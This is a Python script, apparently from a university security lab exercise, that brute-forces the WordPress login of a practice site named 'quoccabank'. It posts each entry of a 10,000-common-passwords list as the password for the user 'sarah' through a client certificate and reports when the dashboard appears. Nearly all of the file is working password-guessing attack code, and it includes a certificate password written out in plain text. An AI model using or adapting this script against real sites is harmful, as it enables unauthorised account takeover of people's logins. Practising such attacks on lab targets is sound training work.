from requests_pkcs12 import post
import re

base_url = 'https://blog.quoccabank.com/wp-login.php'
p12_path = '/Users/bryanle/Downloads/z5361001.p12'
p12_password = 'Qs3/Keg5W3D/kSJJfp9ltw=='

with open('/Users/bryanle/Downloads/10k-most-common.txt', 'r') as file:
    usernames = file.read().splitlines()

# with open('/Users/bryanle/Downloads/10k-most-common.txt', 'r') as file:
#     passwords = file.read().splitlines()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://blog.quoccabank.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://blog.quoccabank.com/wp-login.php',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
}

cookies = {
    'wordpress_test_cookie': 'WP Cookie check',
    'wp_lang': 'en_US',
}
count = 1
for username in usernames:
    data = {
        'log': 'sarah',
        'pwd': username,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }

    response = post(
        base_url,
        headers=headers,
        cookies=cookies,
        data=data,
        pkcs12_filename=p12_path,
        pkcs12_password=p12_password,
    )
    # Check if login was successful
    if 'Dashboard' in response.text or 'Personal Options' in response.text:
        print(f'{count} - Success! Logged in with username: {username}')
        break
    elif response.status_code == 200:
        print(f'{count} - Failed login with username: {username}')
    else:
        print(f'{count} - Something else happened. Status code:', response.status_code)
        print(response.text)
    count += 1
    
    